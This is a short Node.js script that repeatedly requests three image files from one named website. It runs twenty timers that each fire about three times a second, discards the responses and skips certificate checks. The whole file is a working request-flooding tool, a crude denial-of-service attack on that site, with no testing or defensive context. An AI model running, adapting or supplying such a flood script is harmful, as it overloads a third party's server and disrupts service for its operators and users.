const https = require("https");

const bw = "https://bonzi.gay";
const imageUrls = [
    "/img/bonzi/red.png",
    "/img/bonzi/blue.png",
    "/img/bonzi/pope.png",
];
const threads = 20;
const interval = 0.3;
function fetchImages(urls) {
    urls.forEach((url) => {
        const options = {
            hostname: "bonzi.gay",
            path: url,
            method: "GET",
            rejectUnauthorized: false, // Skips certificate validation
        };
    const req = https.request(options, (response) => {
        console.log(`Fetching image from ${url}`);
        response.on("data", () => {});
        response.on("end", () => {
            console.log(`Image from ${url} fetched successfully.`);
        });
    });

    req.on("error", (err) => {
        console.error(`Error fetching image from ${url}: ${err.message}`);
    });req.end();
        });

}
for(let i=0;i<threads;i++){
    setInterval(() => {
        fetchImages(imageUrls);
    }, interval*1000);
}